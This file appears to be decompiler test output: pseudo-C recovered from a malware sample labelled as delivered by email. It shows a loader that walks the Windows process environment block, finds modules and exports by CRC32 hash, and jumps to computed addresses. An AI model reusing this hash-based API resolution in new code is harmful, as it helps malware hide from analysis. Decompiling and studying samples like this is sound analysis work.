// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1233/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(word32 eax, word32 edx, word32 ebx, word32 ebp, byte cl, Eq_30 * fs)
{
	fn00401018();
	Eq_5 * ebx_30 = DPB(dwLoc14, 0x0000, 0, 16);
	Eq_9 * eax_33 = ebx_30 + Mem0[ebx_30 + 0x0000003C:word32];
	Eq_14 * edx_35 = &eax_33->w0014 + (word32) eax_33->w0014;
	word32 eax_42 = edx_35->dw0034 + ebx_30;
	byte bl_55 = fn0040109F(fs, 0x10066F2F);
	(eax_42 + 0x000007EF)();
	0x00000040();
	word32 dwLoc28_65 = edx_35->dw0030;
	fn00401064(dwLoc28_65, ebx);
	return;
}

void fn00401018()
{
	return;
}

word32 fn00401064(word32 dwArg04, word32 dwArg08)
{
	Eq_49 * edx_31 = dwArg04;
	word32 ecx_105 = dwArg08;
	if (dwArg08 == 0x00000000)
	{
		Eq_49 * edi_102 = dwArg04;
		do
		{
			edi_102 = edi_107 + 1;
			Eq_49 * edi_107 = edi_102;
		} while (0x00 != edi_107->b0000);
		ecx_105 = edi_102 - 0x00000001 - dwArg04;
	}
	uint32 eax_40 = ~0x00000000;
	byte al_41 = (byte) eax_40;
	do
	{
		eax_40 = DPB(eax_40, al_41 ^ edx_31->b0000, 0, 8);
		edx_31 = edx_31 + 1;
		byte bl_55 = 0x08;
		do
		{
			eax_40 = eax_40 >>u 0x00000001;
			al_41 = (byte) eax_40;
			if (eax_40 <u 0x00000000)
			{
				eax_40 = eax_40 ^ 0xEDB88320;
				al_41 = (byte) (eax_40 ^ 0xEDB88320);
			}
			bl_55 = bl_55 - 0x01;
		} while (bl_55 != 0x00);
		ecx_105 = ecx_105 - 0x00000001;
	} while (ecx_105 != 0x00000000);
	return ~eax_40;
}

byte fn0040109F(Eq_30 * fs, word32 dwArg04)
{
	Eq_100 * edx_34 = fs->ptr0030->ptr000C->ptr000C;
	do
	{
		edx_34 = edx_34->ptr0000;
		Eq_129 * edi_54 = fp - 0x0000001D;
		Eq_124 * esi_55 = edx_34->ptr0030;
		word32 ecx_178 = 0x0000000D;
		do
		{
			word16 ax_60 = esi_55->w0000;
			edi_54->b0000 = (byte) ax_60;
			esi_55 = esi_55 + 1;
			edi_54 = edi_54 + 1;
			if (ax_60 == 0x0000)
				break;
			ecx_178 = ecx_178 - 0x00000001;
		} while (ecx_178 != 0x00000000);
		word32 ecx_69 = 0x0000000D;
		Eq_111 * esi_70 = fp - 0x0000001D;
		Eq_115 * edi_71 = fp - 0x0000001D;
		do
		{
			bcu8 al_174 = esi_70->b0000;
			esi_70 = esi_70 + 1;
			if (al_174 >=u 0x41 && al_174 <=u 0x5A)
				al_174 = al_174 + 0x20;
			edi_71->b0000 = al_174;
			edi_71 = edi_71 + 1;
			ecx_69 = ecx_69 - 0x00000001;
		} while (ecx_69 != 0x00000000);
		fp->dwFFFFFFB8 = 0x00000000;
	} while ((fn00401064(fp - 0x0000001D, dwLoc48) ^ 0x6AE69F02) != 0x00000000);
	Eq_182 * eax_104 = edx_34->ptr0018;
	Eq_186 * esi_111 = (eax_104 + Mem93[eax_104 + 0x0000003C:word32])->dw0078 + eax_104 + 0x0000001C;
	Eq_197 * edi_112 = fp - 0x00000010;
	word32 ecx_113 = 0x00000003;
	do
	{
		edi_112->dw0000 = esi_111->dw0000 + eax_104;
		esi_111 = esi_111 + 1;
		edi_112 = edi_112 + 1;
		ecx_113 = ecx_113 - 0x00000001;
	} while (ecx_113 != 0x00000000);
	Eq_217 * esi_125 = dwLoc0C;
	do
	{
		word32 eax_132 = esi_125->dw0000 + eax_104;
		fp->dwFFFFFFB8 = 0x00000000;
		esi_125 = esi_125 + 1;
	} while (dwArg04 != fn00401064(eax_132, dwLoc48));
	return (byte) ebx;
}

